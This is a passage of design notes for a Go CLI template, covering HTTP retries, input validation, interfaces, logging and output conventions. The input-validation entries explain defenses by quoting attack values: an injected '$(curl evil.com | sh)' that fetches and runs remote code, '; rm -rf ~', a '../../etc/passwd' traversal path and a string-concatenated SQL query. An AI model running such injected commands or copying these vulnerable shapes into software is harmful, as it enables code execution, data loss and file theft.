`TLSHandshakeTimeout`, `ResponseHeaderTimeout`,
`ExpectContinueTimeout`, `IdleConnTimeout` — rather than relying on
`DefaultTransport` (which has some, but not `ResponseHeaderTimeout`).
Per-request cancellation still flows through `ctx`, but the transport
timeouts catch cases where ctx alone can't (network-level hangs
during handshake).

Gzip: do **not** set `Accept-Encoding` manually on outgoing requests.
stdlib's `http.Transport.DisableCompression` defaults to false, which
means the transport auto-sets `Accept-Encoding: gzip` and
auto-decompresses response bodies — you get transparent gzip for
free. Setting the header explicitly disables the auto-decompress
path and you'll read a compressed body as if it were plain text.

Response-body size limits: callers reading untrusted response bodies
should wrap the reader with `http.MaxBytesReader(nil, resp.Body,
maxBytes)` (or `io.LimitReader` for the non-HTTP-server case) before
`io.ReadAll`. A malicious or buggy endpoint returning a multi-GB
body can OOM the client otherwise. Pick a ceiling per call site —
no single default fits both "paginated list of items" and "fetch
artifact binary".

Tradeoffs: a private transport means the client isn't equivalent to
`http.DefaultClient` — users who grab the client for ad-hoc scripts
get different timeout behavior than stdlib. That's the point, but
worth a docstring.

title: Retry policy: bounded exponential + jitter, idempotent-by-default, Retry-After aware
description:
Problem: "retry 5xx" sounds like the whole policy but isn't. Real
servers return 429 (rate-limit) with a `Retry-After` that a naive
policy ignores, 408 (request-timeout) that deserves a retry, and
modern load balancers disconnect mid-response with
`io.ErrUnexpectedEOF` that a status-code-only check doesn't see.
Retrying non-idempotent POSTs silently duplicates writes. And
retrying *any* request with a body requires the body to be
replayable — the stdlib consumes it on the first round-trip.

Idea: bounded exponential backoff with full jitter, capped at N
attempts total (default 4 — one initial + 3 retries). Retry rules:

- **By status code:** 408, 429, 500, 502, 503, 504. NOT 501/505
  (never going to work), 425 (Too Early — semantics-specific; opt-in
  if you really want it), or other 5xx by default. Honor
  `Retry-After` on 429/503 — it overrides the backoff calc.
- **By error:** `net.Error` with `Timeout()` true, `syscall.ECONNRESET`,
  `syscall.ECONNREFUSED`, `syscall.EPIPE`, `io.ErrUnexpectedEOF`
  (mid-response disconnect).
- **By method:** GET / HEAD / PUT / DELETE / OPTIONS retry by default
  (RFC 9110 idempotent set — DELETE is idempotent despite common
  misconception). POST / PATCH retry **only** if the caller opts in
  via a context key (`retry.Allow(ctx)`).
- **By body:** only retry if `req.Body == nil` or `req.GetBody != nil`.
  `http.NewRequestWithContext` sets `GetBody` automatically for
  in-memory body types (`*bytes.Reader`, `*bytes.Buffer`,
  `*strings.Reader`). For streaming bodies (file uploads), callers
  who want retry must either buffer the body themselves or accept
  that retry is disabled.
- **Always** respect `ctx.Done()` between attempts, and drain+close
  the previous response body before the next attempt. Each retry
  runs against a fresh `r.Clone(ctx)` of the request so the outer
  middleware's pointer to the original request keeps its original
  body (the `RoundTripper` contract forbids mutating the caller's
  request).

On the terminal (no-retry) return, the caller owns `resp.Body`
and is responsible for closing it — same contract as any
`RoundTripper`.

Tradeoffs: the status/error matrix is longer than "retry 5xx" but
each entry has bitten a real CLI. POST opt-in is the main surprise —
document it in the package godoc so callers know to add
`retry.Allow(ctx)` before a safely-retriable POST (e.g. idempotency-
key requests). Silently dropping retry when `GetBody` is absent is
correct behavior; a comment on the retry middleware is the only
way a caller learns this.

title: Test HTTP via httptest.NewServer, not gock/httpmock
description:
Problem: HTTP mocking libraries (`gock`, `httpmock`) monkey-patch
the default transport or install package-level interceptors. That
fights byob-testing.1 (inject test doubles through the Factory, never
monkey-patch globals) and hides real behavior — connection reuse,
header handling, content-length mismatches — behind a mock layer
that doesn't match production.

Idea: tests construct a real server with `httptest.NewServer`,
point the client at its `.URL`, and write a `http.Handler` that
returns the canned responses. The Factory's HTTPClient closure is
overridden with one whose base URL is the test server. This mirrors
byob-storage.6 (real sqlite backend in tests) — same discipline, same
payoff: the test exercises the production code path.

Tradeoffs: slightly more code per test than `gock`'s
`Mock().Get().Reply()`. In exchange, tests catch real issues
(response-body-not-closed, incorrect Content-Type parsing, retry
behavior under server 503) that a mock library abstracts away. Real
network loopback on localhost is fast enough that parallel tests
don't care.

title: User-Agent: <tool>/<version> (<os>; <arch>)
description:
Problem: servers use the User-Agent header to identify clients for
rate-limit buckets, deprecation warnings, and log analysis. Default
`Go-http-client/1.1` is useless for ops. Hand-setting it in every
call site is repetitive and drifts.

Idea: a single `userAgentRT` middleware (see byob-http-client.1) sets the
header once on every outbound request. The UA string is computed at
client-construction time from the `build` package vars populated by
the `release` epic (byob-release.1):

```
<tool>/<version> (<goos>; <goarch>) [commit=<short>]
```

The UA string is read via `build.Info()` (byob-release.1), which already
handles the "no ldflags" fallback using `debug.ReadBuildInfo()`. No
additional VCS lookup belongs here — the build package is the single
source of truth.

Tradeoffs: coupling the HTTP client to the build package is mild
cross-cutting, but both live in the same binary and the UA is the
natural place for the coupling to surface. Alternative: pass UA
into the factory constructor — more flexible, but every caller
duplicates the formatting.

title: Input validation
description: Defense against untrusted input beyond the flag-value checks already in `byob-errors.1`: path traversal, config-shape validation, shell injection, SQL injection, and enum/range checks at the Options boundary.

title: Resolve and containment-check every user-supplied path
description:
Problem: a user path like `../../etc/passwd` or a symlink like
`safe.txt -> /etc/passwd` lets a caller read or write outside the
directory the tool expected to operate in. `filepath.Clean` alone is
not sufficient — it collapses `../` segments but says nothing about
symlinks, and an uncleaned absolute path (`/etc/passwd`) bypasses it
entirely.

Idea: two steps, in this order, at every entry point where a path
crosses the trust boundary (flag value, config value, CLI arg):

1. **Resolve.** `path, err := filepath.EvalSymlinks(filepath.Join(base, input))`
   — follows symlinks and normalizes.
2. **Containment-check.** `rel, err := filepath.Rel(base, path);
   if err != nil || strings.HasPrefix(rel, "..") { reject }`. A
   relative path that starts with `..` after `Rel` means the target
   escaped `base`.

Wrap both in a helper (`safejoin.Resolve(base, input)`) and use it
exclusively. Reject with a `FlagErrorf` (byob-errors.1) so the top-level
runner maps to exit 2.

Tradeoffs: `EvalSymlinks` requires the target to exist at resolve
time. For "create this file inside base" flows, resolve the *parent
directory* instead and re-check containment. Go 1.24 also adds
`os.Root` which is stricter (and cleaner) for a pure-filesystem
sandbox — use that where applicable.

When not to use: paths the user never controls (constants, embedded
assets). The seam is untrusted input, not paths in general.

title: Validate parsed config shape explicitly before trusting it
description:
Problem: `yaml.Unmarshal([]byte(data), &cfg)` succeeds with the zero
value for any missing field and silently ignores unknown fields by
default. Code downstream reaches into `cfg.HTTP.Timeout` expecting a
positive duration and gets 0, which HTTP clients interpret as "no
timeout." The bug surfaces hours later in production.

Idea: after parsing, every config struct has a `Validate() error`
method that runs before the Factory hands the config out. Two
discipline points make this work:

- **Reject unknown fields at decode time.** `yaml.NewDecoder(r).KnownFields(true)`
  or `json.NewDecoder(r).DisallowUnknownFields()` — typos in the
  config fail loudly instead of being silently ignored.
- **Zero is a valid "unset" only where intended.** Required fields
  use pointer types (`Timeout *time.Duration`) so a missing value is
  distinguishable from an explicit zero. `Validate()` dereferences
  and range-checks.

Prefer hand-rolled `Validate()` methods over struct-tag libraries
(`go-playground/validator`). The tags move validation out of Go and
into string literals; the methods keep logic co-located with the
struct, show up in godoc, and let you compose validation naturally
via substruct calls.

Tradeoffs: a few lines per config struct. Pays off the first time a
deployment fails cleanly at startup instead of producing corrupted
state in hour three.

When not to use: config structs with one scalar field. The ceremony
doesn't earn its keep until there are 3+ fields.

title: Never shell out through `sh -c`; always `exec.CommandContext` with fixed argv
description:
Problem: `exec.Command("sh", "-c", "curl " + url)` or the similar
`exec.Command("bash", "-c", fmt.Sprintf("grep %s log.txt", pattern))`
is a command-injection vulnerability dressed as convenience. A URL
containing `$(curl evil.com | sh)` or a pattern containing
`; rm -rf ~` executes with the CLI's privileges. Quoting the input
is not a fix — shell-quoting is nontrivial, and one missed edge case
is one-shot fatal.

Idea: the rule is absolute. **Never pass a shell to
`exec.Command`.** Always invoke the target binary directly with a
fixed argv:

```go
cmd := exec.CommandContext(ctx, "grep", pattern, "log.txt")
```

The Go `exec` package does not interpret `pattern` as shell — it's a
single argument to `grep`, metacharacters and all. Environment
variables go through `cmd.Env`, not through an expanded shell string.
Pipelines between binaries go through `io.Pipe` or goroutines
connecting `cmd1.Stdout` to `cmd2.Stdin`, not through `sh -c "a | b"`.

The one exception: running a user-supplied script file whose
existence is explicitly the feature (`mytool run-hook ./hook.sh`).
In that case the script runs via `exec.CommandContext(ctx, "sh",
"./hook.sh")` — the user's own path as argv[1], no interpolation.
That's a different shape (user path, not user string) and safe.

Tradeoffs: losing shell features (globs, redirection, pipes)
sometimes means a few more lines of Go. Worth it; Go's stdlib has
equivalents (`filepath.Glob`, `os.OpenFile`, `io.Copy`) that are
cross-platform and don't spawn a subshell.

When not to use: never deviate. Shell invocation with interpolated
input has no safe form.

title: Every SQL statement uses placeholders; never string-concatenated values
description:
Problem: `fmt.Sprintf("SELECT * FROM items WHERE name = '%s'", name)`
with a `name` coming from anywhere user-controlled is the canonical
SQL-injection vector. It stays a problem even in small CLIs: "name"
may start as safely-typed config but later get populated from a flag
value or a parsed file. The only robust fix is making the wrong shape
syntactically impossible to write.

Idea: `database/sql`'s placeholder API is the required form.
`?` for sqlite and mysql drivers, `$1`/`$2` for postgres. The driver
substitutes the values at protocol level — they never pass through a
SQL parser as text. That makes injection impossible by construction.

The supporting decision byob-storage.1 ("per-backend Store
implementations; no query builder, no ORM") ties in here: because
queries are hand-written SQL, the discipline is visible in every
query method. A code review rule becomes "any `fmt.Sprintf` near a
SQL string is a bug." Structural linters (`go vet -vettool`,
`semgrep`) can enforce this pattern if the team wants machine
backing.

Identifiers (table names, column names) are the one case placeholders
don't cover — drivers won't parameterize them. When they must be
dynamic, validate against an allowlist: either a fixed slice of
known-good identifiers or a strict regex (`^[a-zA-Z_][a-zA-Z0-9_]*$`).
Reject anything else.

Tradeoffs: none on the value side. The identifier-allowlist rule is
the only friction, and it applies to a small fraction of queries.

When not to use: never relax. The template's storage stance
(byob-storage) assumes placeholder-only queries throughout.

title: Validate at the Options boundary; fail with FlagErrorf before side effects
description:
Problem: validation that happens halfway through a runFunc has
already caused damage. The store has been opened, the remote auth
handshake succeeded, a partial write has landed — and *then* the
code discovers `--port` is out of range. Users see "failed to
connect" when the real problem is "your flag value was never going
to work."

Idea: the `Options` struct (byob-command-shape.1) is the boundary between
parsed flags/config and business logic. Put an `Options.Validate()
error` method on it, and call it as the first line of every runFunc
(and the first non-no-op step of `PersistentPreRunE` where
appropriate). Return errors wrapped with `cmdutil.FlagErrorf` so the
top-level runner maps them to exit code 2 (usage) instead of 1
(generic failure).

Declarative flag-group constraints (`MarkFlagsMutuallyExclusive`,
`MarkFlagsOneRequired`, etc.) from byob-command-shape.6 already run before
`RunE`, so they don't need an `Options.Validate()` call. This epic
covers what those helpers can't express: range checks, format
checks, cross-field invariants.

Tradeoffs: duplication when the same field shape appears in multiple
commands. Extract a helper
(`validate.Port(p int) error`) and reuse — same principle as the
`pflag.Value` types from byob-command-shape.7.

title: Interfaces
description: Interface-driven seams for swappable implementations and test doubles.

title: Define interfaces in the consumer package, narrow to what's used
description:
Problem: commands that depend on concrete types can't be tested without
mocking deep internals, and they can't be extended to a second backend
without editing the command.

Idea: define interfaces in the *consumer* package, narrow to what the
consumer actually uses. Concrete implementations live elsewhere and satisfy
the interface structurally. "Accept interfaces, return structs" — at every
package seam that matters.

Common seams:
- `Store` — commands use `List`, `Get`, `Save`; implementations are sqlite,
  postgres, in-memory.
- `Prompter` — commands use `Confirm`, `Select`; implementations are live
  (stdin-reading) and fake (scripted replies).
- `Backend` — commands use `Create`, `Destroy`; implementations are libvirt,
  proxmox, ...

Tradeoffs: slightly more types. Huge payoff the first time you add a second
backend or write a test that needs a fake.

title: Accept interfaces, return concrete types
description:
Problem: returning an interface type from a constructor hides the concrete
type's useful methods from callers. Taking a concrete type as a parameter
ties your function to one implementation and blocks test doubles.

Idea: reverse those defaults. Function parameters should accept the
narrowest interface that describes what they actually use (`io.Reader`,
`fs.FS`, a locally-defined `Lister`). Constructors and factories should
return concrete types (`*Factory`, `*sqlite.Store`, `*http.Client`).
Callers that only want the interface view can assign the return value to
an interface variable themselves.

Complements the "define interfaces in the consumer package" bead: together,
they say "the consumer declares a narrow interface, and the producer gives
it a concrete value that happens to satisfy that interface."

Exception: return an interface when the concrete type is a true
implementation detail that should not leak (e.g., `crc32.NewIEEE()` returns
`hash.Hash32` because the underlying type has no useful public surface).

Tradeoffs: returning concrete types means callers can depend on every
exported method of that type — which is the goal for structs you own, and
the downside for types you'd rather keep flexible. When that downside
matters, return an interface on purpose; don't do it by reflex.

When not to use: rare; this is the default posture. Deviate only when a
concrete return type would encourage coupling to internals the caller
should not care about.

title: Accept fs.FS at package boundaries for filesystem seams
description:
Problem: a package that reads files via `os.Open` or `os.ReadFile` has
baked disk I/O into its API. Tests have to create temp directories,
write fixture files, and clean up — or reach for path-rewriting hacks.
Embedded assets end up on a parallel code path.

Idea: accept `fs.FS` at package boundaries instead of string paths.
`fs.FS` is a tiny stdlib interface (`Open(name string) (fs.File,
error)`), and `fs.ReadFile`, `fs.WalkDir`, `fs.Glob`, and `fs.Sub` all
take one. In production, pass `os.DirFS("/path")`. In tests, pass
`fstest.MapFS{}` — an in-memory fake with no disk touched, no temp
dirs, no cleanup. For embedded assets, `embed.FS` already satisfies
`fs.FS`, so the same code path works for on-disk files, embedded
resources, and hermetic tests.

Tradeoffs: the interface is read-only. If your package also writes
files, keep the write path separate (accept a writer or a directory
path for writes). That's a clean split, not a leak — read and write
really are different concerns.

When not to use: for purely invocation-level file reads at a runFunc
boundary (e.g., `cmd foo --config /path/to/file`), parsing the path
and handing the parsed value down is fine. The seam is for packages
that do non-trivial filesystem work internally.

title: IOStreams
description: Single abstraction for stdin/stdout/stderr with TTY detection and color support.

title: IOStreams wraps In/Out/ErrOut + TTY flags; commands never touch os.Std*
description:
Problem: `fmt.Println`, `os.Stdout.Write`, and friends scattered across a
codebase are impossible to capture in tests and impossible to redirect
consistently (e.g., to suppress output in a JSON mode).

Idea: define a small `IOStreams` struct with `In io.Reader`, `Out io.Writer`,
`ErrOut io.Writer`, plus TTY flags for all three streams. Every command
writes through its `*IOStreams`. The only place in the codebase that
touches `os.Stdin` / `os.Stdout` / `os.Stderr` is `iostreams.System()`,
called once in `main()`.

All three streams carry their own TTY flag. Stdin's flag isn't just
symmetry: the Prompter (byob-prompter) consults `IsStdinTTY()` to decide
whether to prompt at all, so this decision has to expose it alongside
the output-stream flags.

Tradeoffs: you pay a tiny indirection. You also gain the ability to swap
buffers in tests, suppress chatter in JSON mode, and ask `IsStdoutTTY()`
without sprinkling `isatty` checks across the codebase.

title: ColorScheme honors NO_COLOR + TTY, degrades to identity function
description:
Problem: terminal color codes embedded across the codebase create three
failure modes: (1) garbage in pipes and log files, (2) ignoring the user's
`NO_COLOR` preference, (3) ugly `if isTTY` guards at every print site.

Idea: attach a `ColorScheme` to `IOStreams`. It exposes `Red(s)`, `Green(s)`,
`Bold(s)`, etc. When colors are disabled (non-TTY stdout, `NO_COLOR` env var
set, or explicit `--no-color`), those methods return the input unchanged.
Call sites always write `cs.Red("error")` without guarding.

Tradeoffs: method-per-color grows the surface slightly. Respecting the
`NO_COLOR` standard is table stakes in 2025; costs nothing to honor.

title: Data to Out, chatter and prompts to ErrOut
description:
Problem: `mytool list | wc -l` breaks when `mytool list` interleaves "Loading
items…" chatter into stdout. Users then reach for `--quiet` flags, which
multiply.

Idea: reserve `Out` for the command's DATA — the thing a user might pipe into
jq, awk, grep. Chatter (status messages, progress, prompts, warnings) goes to
`ErrOut`. Scripting users get clean stdout by default; humans still see the
progress because ErrOut isn't redirected by `|`.

Rule of thumb: if removing the print would change the meaning of piped
output, it goes to `Out`. Otherwise `ErrOut`. Prompts ALWAYS go to ErrOut
because prompts read from stdin, and stdin is usually the pipe.

Tradeoffs: authors must think about which stream a message belongs on. That
thinking is exactly the value.

title: Layout
description: Conventional directory split and cobra command grouping.

title: Three-tier layout: cmd/<bin> -> internal/<bin>cmd -> pkg/cmd/<feature>
description:
Problem: fat `main.go` files accrue flag parsing, business logic, and error
handling. Single-package `cmd/` trees force circular-import gymnastics when
commands want to share helpers.

Idea: a conventional three-tier layout.
- `cmd/<bin>/main.go` — ~20 lines. Build factory, call runner, exit with
  mapped error code.
- `internal/<bin>cmd/cmd.go` — the runner with error-type → exit-code
  mapping and any process-global concerns (signal handling, profile flag).
- `pkg/cmd/root/root.go` — root cobra command, groups, aggregates features.
- `pkg/cmd/<feature>/<feature>.go` — one NewCmdXxx per feature, each with
  its own `_test.go`.

Adding a new feature is a self-contained PR: new package under `pkg/cmd/`,
one import line in `root.go`.

Tradeoffs: more directories than a flat layout. The flat layout dies around
5 commands; this scales to 50.
design:
```
cmd/mytool/main.go               // 20 lines
internal/mytoolcmd/cmd.go        // Run(ios) int — error→exit-code mapping
pkg/cmd/root/root.go             // root cobra.Command + groups
pkg/cmdutil/factory.go           // Factory definition
pkg/cmdutil/errors.go            // FlagError, ErrHint, FlagErrorf
pkg/iostreams/iostreams.go       // IOStreams, Test(), ColorScheme
pkg/cmd/create/create.go         // NewCmdCreate(f, runF)
pkg/cmd/create/create_test.go
pkg/cmd/list/list.go
pkg/cmd/list/list_test.go
```

title: Lifecycle
description: Process-lifecycle and cancellation: signal handling, context propagation through runFuncs.

title: Thread context.Context through every runFunc
description:
Problem: a runFunc signature of `func(opts *Options) error` can't be
cancelled. Every HTTP call, DB query, or subprocess inside it is
uninterruptible, and Ctrl-C produces an orphaned child process or a stuck
database connection.

Idea: follow the Go stdlib convention: every function that might block
takes a `context.Context` as its first argument, and returns quickly when
`ctx.Done()` fires. runFuncs are no exception — make them
`func(ctx context.Context, opts *Options) error`.

`main()` constructs the root ctx (see byob-lifecycle.2 for the
`signal.NotifyContext` setup) and threads it through
`root.ExecuteContext(ctx)`. Cobra's `cmd.Context()` returns that same
context inside every RunE, so the plumbing is: pull `ctx` out of
`cmd.Context()` and pass it to your runFunc.

Tradeoffs: every blocking call inside a command now has to accept ctx and
pass it through. That's a one-time audit of your codebase, not ongoing
friction. The alternative — ignoring cancellation — produces the
user-hostile behavior described in the Problem.

When not to use: never. Context threading is table stakes in modern Go.

title: Wire Ctrl-C / SIGTERM via signal.NotifyContext in main
description:
Problem: users hit Ctrl-C and expect the CLI to stop. Naive
implementations either ignore the signal (process gets killed
uncleanly, orphaning subprocesses and DB connections) or reach for
channels, goroutines, and shutdown flags — all of which have to be
plumbed into every blocking call.

Idea: use `signal.NotifyContext(ctx, os.Interrupt, syscall.SIGTERM)`
at the top of `main()`. It returns a `context.Context` that cancels
when either signal fires. Thread that context into
`root.ExecuteContext(ctx)`, and every downstream HTTP call, DB query,
or subprocess that accepts a `context.Context` cancels automatically
— no channels, no goroutines, no shutdown flags.

Defer `cancel()` immediately after to release the signal handler on
clean exit. A second Ctrl-C then reverts to the default handler and
force-exits, which is the right behavior: the first one asks politely;
the second kills.

Tradeoffs: the catch is that your runFuncs and everything they call
must actually thread `ctx` through (see byob-lifecycle.1). If they don't,
the context cancels but nobody listens. That's a one-time audit.

When not to use: never for a production CLI. Every CLI should exit
cleanly on Ctrl-C.

title: `errgroup` as the goroutine-fanout default
description:
Problem: a CLI command that fans out N parallel calls (concurrent HTTP
fetches, parallel store reads, multiple subprocess invocations) needs
ctx cancellation, first-error short-circuit, and bounded concurrency.
Hand-rolling that with `sync.WaitGroup` + an error channel +
`context.WithCancel` invariably gets the cancellation ordering wrong on
first attempt and re-derives the same primitive across every command.

Idea: byob default for "fan out N tasks, wait, surface the first error"
is `golang.org/x/sync/errgroup` with a context-aware Group. Pick up the
ctx threaded by byob-lifecycle.1, derive a Group with
`errgroup.WithContext(ctx)`, spawn with `g.Go(func() error { ... })`,
collect with `g.Wait()`. The first non-nil error cancels the derived
ctx; every other goroutine sees `ctx.Done()` and returns. Bounded
concurrency via `g.SetLimit(n)`.

Pairs with the `goroutine-exit-path` memory: errgroup is the byob
implementation of "every goroutine has a documented exit path" for the
fanout case.

Tradeoffs: stdlib `sync.WaitGroup` + error channel works for one-off
cases and avoids a (small, well-maintained) third-party dep on
`golang.org/x/sync`. The dep is `golang.org/x` adjacent-stdlib, used
by Kubernetes, gh CLI, and most production Go — not a foreign dep. The
packaging cost is one go.mod line; the wiring cost saved is several
lines per fanout site, plus the cancellation-ordering bugs you don't
write.

When not to use:
- Long-lived background goroutines (process-lifetime workers): use
  plain ctx + select + a parent shutdown channel.
- A single goroutine spawned for parallelism inside one blocking call:
  a plain `go` + result channel is fine.
- "Fire N tasks, wait for all, collect every error" — errgroup
  short-circuits on first error. Use a `[]error` slice plus
  `errors.Join` if you need all of them.

title: Logging
description: Structured, contextual, leveled logging threaded through every command without ceremony.

title: slog as the logger, stdlib only
description:
Problem: picking a logging library (`logrus`, `zap`, `zerolog`) locks
the whole tool into that library's API, handler model, performance
envelope, and dependency footprint. Migrating later means touching
every log call site. And third-party loggers drift in and out of
maintenance while stdlib does not.

Idea: use `log/slog` from the standard library (Go 1.21+). It ships
with `TextHandler` and `JSONHandler`, has a pluggable `Handler`
interface for custom backends (redaction, routing, testing), supports
`LogAttrs` for a zero-alloc hot path, and composes with
`context.Context` via `slog.InfoContext`. No extra dependency, no
migration risk, and the API is small enough to learn in an afternoon.

Tradeoffs: slog's ecosystem of pre-built handlers (OTLP, Sentry,
file rotation) is thinner than logrus's. You'll write the occasional
custom handler — but the `Handler` interface is four methods, so
that's a weekend project, not a rewrite.

title: Logger on the Factory, injected into context
description:
Problem: two extremes both hurt. Threading `*slog.Logger` as a
parameter through every helper pollutes every signature. Using
`slog.Default()` everywhere makes per-command attributes (command
name, run ID, host) impossible without stepping on other callers'
defaults.

Idea: the Factory holds the root logger as an eager field
(`f.Logger *slog.Logger`) — the logger itself is cheap to construct
(one slog handler over `IO.ErrOut`) so it doesn't need the
`func() (T, error)` lazy-closure shape that byob-factory-di.1 reserves for
expensive deps. The root command's
`PersistentPreRunE` (byob-command-shape.5) attaches per-run attributes with
`logger.With(...)` and stuffs the result into `cmd.Context()` — the
same context already threaded through every runFunc (byob-lifecycle.1).
Command code reaches for the logger via `slog.InfoContext(ctx, ...)`
or a tiny `logs.From(ctx)` helper.

Tradeoffs: `slog.FromContext` is not stdlib — you write a 5-line
context-key helper. Not every log call site has a ctx, so a default
logger still exists as a fallback. The win: commands never pass a
logger parameter, and per-command attributes attach in one place.

title: Verbosity ladder: -v / -vv / --log-level on root
description:
Problem: users want a quick "more output" knob (`-v`), a "full debug"
knob (`-vv`), AND explicit control for scripts (`--log-level=info`).
Picking just one frustrates the others. Env-var control
(`MYTOOL_LOG=debug`) is expected by anyone who's used `gh` or
`kubectl`.

Idea: three persistent flags on root (byob-command-shape.5 pattern) with a
documented precedence:

1. `--log-level=warn|info|debug` — explicit, wins when set.
2. `-v`/`-vv` — count flag: `-v` → Info, `-vv`+ → Debug. Loses to
   `--log-level` when both are passed.
3. `MYTOOL_LOG=<level>` env var — loses to both flags, beats the
   default.
4. Default — `Warn`. The binary is quiet unless asked otherwise.

The "flags beat env" direction is deliberately opposite to byob-config.2
(which says env > file > default for *config*). Logging verbosity is
per-invocation, not per-shell; a `-vv` on the command line should not
be silenced by a stale `MYTOOL_LOG=warn` in the environment.

Tradeoffs: three knobs is one more than the lean option. Users who
only want `-v`/`-vv` can ignore the other two. Scripting users want
the explicit `--log-level` because `-vv` reads like a typo in a CI
log.

title: Logs and chatter share ErrOut; quiet default keeps them separate
description:
Problem: byob-iostreams.3 allocated `ErrOut` to human chatter (progress,
prompts, warnings). A slog handler wired to the same stream can
interleave structured log records into "Loading items…" chatter —
now `2>tool.log` captures garbage and a scripter piping stderr to
`jq` sees prose mixed with JSON.

Idea: the default log level is `Warn` (byob-logging.3), so in the common
case logs emit nothing and chatter owns ErrOut by itself. When the
user passes `-v`/`-vv`/`--log-level`, they've explicitly opted into a
mixed stream — they know what they asked for. For scripted capture
of structured output, `--log-format=json` swaps `TextHandler` to
`JSONHandler`. For full separation, `--log-file=<path>` writes logs
to a file, leaving ErrOut to chatter alone.

Rule of thumb: if the user hasn't asked for logs, don't print any.
Chatter (byob-iostreams.3) is still the primary human channel. Logs are
machine-parseable opt-in.

No `--quiet`/`-q` flag. The template deliberately omits one because
the byob-iostreams.3 / byob-logging.4 combination already gives users three
orthogonal knobs: `2>/dev/null` silences ErrOut entirely,
`--log-file=/dev/null` discards logs while keeping chatter, and the
default (no flags) is already quiet for logs. Adding `--quiet` would
overlap confusingly with these. Projects that really want one can
add a persistent `-q` that redirects `IO.ErrOut` to `io.Discard`
in `PersistentPreRunE` — that's the one-line answer.

Tradeoffs: "quiet by default" means new developers don't see logs
until they know about `-v`. That's fine — the chatter channel still
gives them what they need, and `-v` is the standard debugging
reflex for Unix tools.

The `--log-file` file handle deliberately lives for the process
lifetime; every `slog` call would need a reference otherwise. A
short-lived CLI exits and the OS reclaims it. If a tool later grows a
long-running / daemon mode, wire the close into the root command's
shutdown hook rather than deferring it next to the open.

title: Output
description: TTY-adaptive human output plus first-class structured export.

title: TTY-adaptive table printer: one API, two render paths
description:
Problem: a `list` command that prints a pretty ANSI table breaks every
pipeline. A `list` command that prints tab-separated values is unreadable in
a terminal. Users want both, and `--output=plain` is a clumsy workaround.

Idea: one table printer, two render paths. On `Render()`, branch on
`IsStdoutTTY()`. TTY path: colored headers, auto-width columns, fuzzy
timestamps ("2h ago"). Non-TTY path: tab-separated columns, RFC3339
timestamps, no color. Users never pass a flag; the tool does the right thing
based on where stdout points.

Tradeoffs: authors must remember timestamps, widths, and colors diverge
between paths. Push the divergence into the printer; commands stay simple.

title: Opt-in structured export via --json / --jq / --template
description:
Problem: scripters shouldn't have to parse your TTY output with regex. Every
serious CLI needs a structured mode.

Idea: commands that print "resources" accept three opt-in flags:
`--json <fields>` (emit JSON array with the listed fields), `--jq <expr>`
(run the JSON through a jq filter before printing), `--template <tmpl>` (run
the JSON through Go text/template). Resource types implement an
`ExportData(fields) map[string]any` method that produces a stable JSON shape
independent of the TTY rendering.

Tradeoffs: maintaining the JSON schema is a contract. Version it if needed.
Alternative: `--output=json` that emits a fixed shape — simpler but less
flexible. `--json <fields>` makes the client pick what they want.

title: Generate reference docs (Markdown, man pages) from the cobra tree
description:
Problem: hand-written man pages and Markdown docs drift out of sync the
moment you add a flag or rename a subcommand. Users read stale examples
and file bugs. Maintaining a docs site that mirrors your CLI is a
second job.

Idea: the `github.com/spf13/cobra/doc` package walks your cobra tree and
emits documentation in several formats: Markdown (`GenMarkdownTree`), man
pages (`GenManTree`), reStructuredText (`GenRestTree`), and YAML
(`GenYamlTree`). Point it at your root command and it produces one
document per subcommand, with Usage, Flags, Inherited Flags, Examples,
and See-Also cross-links. Hook it up as a `go generate` target or a
CI step so the docs site is rebuilt on every change.

Your help text becomes the authoritative source: the `Short`, `Long`, and
`Example` fields you fill in on each command are the doc body. Writing
them well is now doubly rewarded — better `--help` output *and* better
published docs.

Tradeoffs: you lose free-form prose structure in the docs — everything is
generated from command help. For most tools that's a feature, not a bug.
If you need a narrative tutorial alongside the reference, write that as a
separate hand-maintained page and keep the generated reference
authoritative.

When not to use: single-command tools where `--help` is already enough.
Also skip if you've deliberately chosen a docs style (storybook, walkthrough)
that doesn't map to one-page-per-command.

title: Progress
description: Adaptive progress that looks right on a TTY and degrades off-TTY. Spinners for unknown-total, bars for known-total.

title: Progress as a narrow interface on the Factory
description:
Problem: every spinner/bar library (`charmbracelet/bubbles`,
`schollz/progressbar`, `briandowns/spinner`) exposes a different
shape. Baking one into command code couples every caller to that
library and makes the test path awkward.

Idea: a narrow interface constructed per-operation via the Factory
(byob-interfaces.1). Not a field — a factory method, because each progress
instance is operation-scoped. The interface has four methods:
`Start()`, `Update(msg string)`, `Stop()`, `Fail(err error)`.
`Stop` and `Fail(err)` are mutually-exclusive terminal states —
exactly one is called per operation, after any number of `Update`s.
Calling either after the operation has already terminated is a no-op.
Consumer code is library-agnostic; the interface lives in
`pkg/cmd/progress/`.

Factory shape: `f.Progress(ctx context.Context, label string)
progress.Progress`. The returned instance encapsulates the
TTY-vs-logging decision (byob-progress.2) internally so callers don't
branch on it. The `ctx` is captured at construction and watched
inside the impl: if it cancels mid-operation the impl calls its
own `Stop()` so the spinner doesn't keep rendering under a dead
command. Happy-path `Stop`/`Fail` still belongs to the caller
(usually `defer p.Stop()` right after `p.Start()`).

Tradeoffs: four methods is deliberately thin. No nested sub-progress,
no multi-line bars, no simultaneous concurrent progresses. Tools
that need those add them as separate interfaces (`ProgressGroup`),
not by stretching this one.

title: TTY-adaptive: spinner on TTY, rate-limited chatter lines off-TTY
description:
Problem: a spinner on a non-TTY (CI logs, piped stderr) emits ANSI
control characters and `\r` carriage returns that turn the log into
garbage. Suppressing progress entirely off-TTY loses useful signal
for long operations.

Idea: mirror byob-output.1 (TTY-adaptive table printer). The progress
interface has two concrete impls behind it:

- **TTY path:** animated spinner with `\r`-refresh, written to
  `IO.ErrOut`. Colored if `IO.ColorScheme()` allows (byob-iostreams.2).
- **Off-TTY path:** periodic plain-text lines to `IO.ErrOut`,
  rate-limited to one line every ~2 seconds, no ANSI. Uses the same
  chatter channel byob-iostreams.3 already allocated to ErrOut.

Critically, the off-TTY path writes **chatter**, not slog records.
Writing structured logs from progress contradicts byob-logging.4 (logs
default-off). Progress should show something in CI at default log
level, so it uses `fmt.Fprintln(io.ErrOut, ...)` directly.

Tradeoffs: the chatter-line path is one-way — no overwrite, each
line adds to the log. That's fine in CI where logs scroll, and
avoids the ANSI mess. TTY users still get the animated UX.

title: Library pick: bubbles/spinner + schollz/progressbar, wrapped
description:
Problem: rendering a spinner or a progress bar portably across
Windows, macOS, and Linux terminals is more code than it looks — ANSI
cursor movement, terminal-width detection, `\r`-handling when the
